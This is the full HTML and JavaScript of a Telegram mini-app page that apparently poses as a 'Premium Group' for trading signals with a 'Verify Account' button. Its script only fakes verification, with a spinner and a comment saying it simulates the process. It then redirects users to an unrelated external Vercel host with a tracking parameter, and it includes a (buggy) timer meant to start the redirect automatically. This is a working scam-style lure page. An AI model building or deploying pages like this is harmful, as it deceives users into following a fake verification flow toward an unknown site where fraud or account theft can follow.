<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Homit Support - Premium Group Access</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #1a1a1a;
            color: #ffffff;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .container {
            max-width: 100%;
            min-height: 100vh;
            background: #1a1a1a;
            padding: 20px 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .logo {
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 16px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            color: white;
            font-weight: bold;
        }

        .title {
            font-size: 20px;
            font-weight: 600;
            color: #ffffff;
            margin-bottom: 8px;
            text-align: center;
        }

        .subtitle {
            font-size: 15px;
            color: #b0b0b0;
            margin-bottom: 32px;
            line-height: 1.4;
            text-align: center;
            max-width: 280px;
        }

        .verify-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 14px 24px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            max-width: 280px;
            transition: all 0.2s ease;
            margin-bottom: 16px;
        }

        .verify-btn:hover {
            background: #5a67d8;
        }

        .verify-btn:active {
            transform: scale(0.98);
        }

        .loading {
            display: none;
            margin-top: 16px;
            text-align: center;
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #3a3a3a;
            border-top: 2px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 8px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status {
            font-size: 13px;
            color: #b0b0b0;
        }

        .footer {
            margin-top: 24px;
            font-size: 12px;
            color: #808080;
            text-align: center;
            max-width: 280px;
        }

        /* Telegram WebApp specific adjustments */
        @media (max-width: 480px) {
            .container {
                padding: 16px 12px;
            }
            
            .title {
                font-size: 18px;
            }
            
            .subtitle {
                font-size: 14px;
            }

            .logo {
                width: 56px;
                height: 56px;
                font-size: 24px;
            }
        }

        /* Dark theme specific colors */
        .tg-theme-bg {
            background: #1a1a1a !important;
        }

        .tg-theme-text {
            color: #ffffff !important;
        }

        .tg-theme-hint {
            color: #b0b0b0 !important;
        }

        .tg-theme-link {
            color: #667eea !important;
        }

        .tg-theme-button {
            background: #667eea !important;
            color: #ffffff !important;
        }

        .tg-theme-button-text {
            color: #ffffff !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">H</div>
        
        <h1 class="title">Homit Premium Group</h1>
        <p class="subtitle">Join our exclusive community for premium trading signals and expert insights.</p>

        <button class="verify-btn" onclick="startVerification()">
            üîê Verify Account
        </button>

        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="status">Verifying your account...</div>
        </div>

        <div class="footer">
            <p>By joining, you agree to our terms of service.</p>
        </div>
    </div>

    <script>
        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const startParam = urlParams.get('startapp') || urlParams.get('start');
        
        // Initialize Telegram WebApp
        if (window.Telegram && window.Telegram.WebApp) {
            try {
                // Initialize the WebApp
                window.Telegram.WebApp.ready();
                
                // Expand to full height
                window.Telegram.WebApp.expand();
                
                // Set theme colors based on Telegram theme
                const themeParams = window.Telegram.WebApp.themeParams;
                if (themeParams) {
                    // Apply Telegram theme colors
                    document.body.style.backgroundColor = themeParams.bg_color || '#1a1a1a';
                    document.body.style.color = themeParams.text_color || '#ffffff';
                    
                    // Update container background
                    const container = document.querySelector('.container');
                    if (container) {
                        container.style.backgroundColor = themeParams.bg_color || '#1a1a1a';
                    }
                }

                // Set header color
                window.Telegram.WebApp.setHeaderColor('#1a1a1a');
                
                // Set background color
                window.Telegram.WebApp.setBackgroundColor('#1a1a1a');
                
            } catch (e) {
                console.log('Telegram WebApp initialization error:', e);
            }
        }

        function startVerification() {
            const btn = document.querySelector('.verify-btn');
            const loading = document.getElementById('loading');
            
            // Show loading state
            btn.style.display = 'none';
            loading.style.display = 'block';
            
            // Simulate verification process
            setTimeout(() => {
                // Redirect to the verification URL
                const verificationUrl = `https://caca-seven.vercel.app/?arg=${startParam || '6735653727_D'}`;
                
                // Try to open in Telegram WebApp first
                if (window.Telegram && window.Telegram.WebApp) {
                    try {
                        window.Telegram.WebApp.openTelegramLink(verificationUrl);
                    } catch (e) {
                        // Fallback to regular redirect
                        window.location.href = verificationUrl;
                    }
                } else {
                    // Fallback to regular redirect
                    window.location.href = verificationUrl;
                }
            }, 2000); // 2 second delay to show loading
        }

        // Auto-start verification after 5 seconds if no interaction
        let autoStartTimer = setTimeout(() => {
            if (!document.querySelector('.verify-btn').style.display === 'none') {
                startVerification();
            }
        }, 5000);

        // Clear auto-start timer if user interacts
        document.addEventListener('click', () => {
            clearTimeout(autoStartTimer);
        });

        // Handle back button
        if (window.Telegram && window.Telegram.WebApp) {
            window.Telegram.WebApp.BackButton.onClick(() => {
                window.Telegram.WebApp.close();
            });
        }

        // Log for debugging
        console.log('Homit Support Mini-App loaded');
        console.log('Start parameter:', startParam);
        console.log('User agent:', navigator.userAgent);
    </script>
</body>
</html>
